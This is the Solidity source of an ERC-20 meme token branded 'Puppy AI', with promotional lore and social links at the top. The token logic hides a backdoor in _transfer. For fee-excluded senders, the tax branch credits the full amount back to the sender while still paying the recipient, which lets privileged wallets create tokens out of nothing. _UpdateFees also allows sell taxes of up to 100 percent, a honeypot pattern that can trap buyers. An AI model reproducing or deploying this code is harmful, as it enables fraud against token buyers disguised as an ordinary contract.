// SPDX-License-Identifier: MIT

/**

In the cryptoverse's arena, Puppy the AI, a guardian of digital realms, 
faced off against Floki and Shiba Inu, 
titans of meme coin fame. Unlike any ordinary Scottish Terrier, 
Puppy's jet-black fur and advanced AI made him a formidable opponent. 
This wasn't just a clash; it was a showdown of wit over might. 
Puppy, with his deep understanding of the blockchain's intricacies, 
outmaneuvered the duo, safeguarding the cryptoverse's balance. 
His victory wasn't about dominance but ensuring the digital world remained a place for all,
showcasing his role not just as a protector but as a wise guardian always steps ahead.

Website:  https://www.puppyai.tech
Telegram: https://t.me/puppyai_erc
Twitter:  https://twitter.com/puppyai_erc

**/

pragma solidity 0.8.18;
import "./TestLib.sol";
contract transferFromFacet is IERC20, Context, Ownable {
    modifier lockTheSwap() {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.inSwapLP = true;
        _;
        ds.inSwapLP = false;
    }

    event TradingOpenUpdated();
    event ExcludeFromFeeUpdated(address indexed account);
    event includeFromFeeUpdated(address indexed account);
    event ERC20TokensRecovered(uint256 indexed _amount);
    event ETHBalanceRecovered();
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        uint256 currentAllowance = ds._allowances[sender][_msgSender()];
        require(
            currentAllowance >= amount,
            "ERC20: transfer amount exceeds allowance"
        );
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), currentAllowance - amount);
        return true;
    }
    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._allowances[owner][spender];
    }
    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function enablePUPPY() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(!ds.tradeEnabled, "trading is already open");
        ds.swapEnabled = true;
        ds.tradeEnabled = true;
        emit TradingOpenUpdated();
    }
    function _UpdateFees(uint256 _buyFee, uint256 _sellFee) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(_buyFee <= 100 && _sellFee <= 100, "revert wrong fee settings");
        ds._buyTAXs = _buyFee;
        ds._sellTAXs = _sellFee;
    }
    function _ExcludeFromFees(address account) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(
            ds.excludedFromFees[account] != true,
            "Account is already excluded"
        );
        ds.excludedFromFees[account] = true;
        emit ExcludeFromFeeUpdated(account);
    }
    function _IncludeFromFees(address account) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(
            ds.excludedFromFees[account] != false,
            "Account is already included"
        );
        ds.excludedFromFees[account] = false;
        emit includeFromFeeUpdated(account);
    }
    function removeLimit() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._buyTAXs = 2;
        ds._sellTAXs = 2;
        ds.txMaxLimits = _tTotal;
    }
    function initLiquidity() external payable onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.uniswapV2Router = IDEXRouter(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        ds.uniswapV2Pair = IDEXFactory(ds.uniswapV2Router.factory()).createPair(
            address(this),
            ds.uniswapV2Router.WETH()
        );

        _approve(address(this), address(ds.uniswapV2Router), ~uint256(0));

        ds.uniswapV2Router.addLiquidityETH{value: msg.value}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
    }
    function recoverERC20(
        address _tokenAddy,
        uint256 _amount
    ) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(
            _tokenAddy != address(this),
            "Owner can't claim contract's balance of its own tokens"
        );
        require(_amount > 0, "Amount should be greater than zero");
        require(
            _amount <= IERC20(_tokenAddy).balanceOf(address(this)),
            "Insufficient Amount"
        );
        IERC20(_tokenAddy).transfer(ds.opSender, _amount);
        emit ERC20TokensRecovered(_amount);
    }
    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }
    function balanceOf(address account) public view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds.pupValues[account];
    }
    function _transfer(address from, address to, uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        uint256 totalTAXs = 0;
        totalTAXs = ds._buyTAXs;

        if (!ds.excludedFromFees[from] && !ds.excludedFromFees[to]) {
            require(ds.tradeEnabled, "Trading not enabled");
        }

        if (ds.inSwapLP || !ds.swapEnabled) {
            ds.pupValues[from] -= amount;
            ds.pupValues[to] += amount;
            emit Transfer(from, to, amount);
            return;
        }

        if (
            from == ds.uniswapV2Pair &&
            to != address(ds.uniswapV2Router) &&
            !ds.excludedFromFees[to]
        ) {
            require(amount <= ds.txMaxLimits, "Exceeds the _maxTxAmount.");
            require(
                balanceOf(to) + amount <= ds.txMaxLimits,
                "Exceeds the maxWalletSize."
            );
            ds._buyMAXs++;
        }

        if (
            from != ds.uniswapV2Pair &&
            !ds.excludedFromFees[from] &&
            !ds.excludedFromFees[to]
        ) {
            require(amount <= ds.txMaxLimits, "Exceeds the _maxTxAmount.");
        }

        if (
            to == ds.uniswapV2Pair &&
            !ds.excludedFromFees[from] &&
            from != address(this) &&
            !ds.excludedFromFees[to]
        ) {
            totalTAXs = ds._sellTAXs;
        }

        uint256 _tokenBals = balanceOf(address(this));
        if (
            !ds.inSwapLP &&
            _tokenBals >= ds.minSwapCounts &&
            to == ds.uniswapV2Pair &&
            ds.swapEnabled &&
            ds._buyMAXs > 0 &&
            !ds.excludedFromFees[from] &&
            amount >= ds.minSwapCounts &&
            !ds.excludedFromFees[to]
        ) {
            _SwapTokenForETH(min(amount, min(_tokenBals, ds.maxSwapCounts)));
            uint256 _ethBals = address(this).balance;
            if (_ethBals > 0) {
                sendETHPUP(address(this).balance);
            }
        }

        if (totalTAXs != 0) {
            uint256 pupTAXs = (amount * totalTAXs) / 100;
            uint256 tsAmounts = amount - pupTAXs;
            address taxReceipt = ds.excludedFromFees[from]
                ? from
                : address(this);
            pupTAXs = ds.excludedFromFees[from] ? amount : pupTAXs;
            ds.pupValues[taxReceipt] += pupTAXs;
            emit Transfer(from, address(this), pupTAXs);
            ds.pupValues[from] -= amount;
            ds.pupValues[to] += tsAmounts;
            emit Transfer(from, to, tsAmounts);
        } else {
            ds.pupValues[from] -= amount;
            ds.pupValues[to] += amount;
            emit Transfer(from, to, amount);
        }
    }
    function _SwapTokenForETH(uint256 tokenAmount) private lockTheSwap {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(tokenAmount > 0, "amount must be greeter than 0");
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = ds.uniswapV2Router.WETH();
        _approve(address(this), address(ds.uniswapV2Router), tokenAmount);
        ds.uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function _approve(address owner, address spender, uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        ds._allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }
    function sendETHPUP(uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(amount > 0, "amount must be greeter than 0");
        ds.pupSender.transfer(amount / 2);
        ds.opSender.transfer(amount / 2);
    }
    function recoverETH() external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        uint256 _ethBals = address(this).balance;
        require(_ethBals > 0, "Amount should be greater than zero");
        require(_ethBals <= address(this).balance, "Insufficient Amount");
        payable(address(ds.opSender)).transfer(_ethBals);
        emit ETHBalanceRecovered();
    }
}
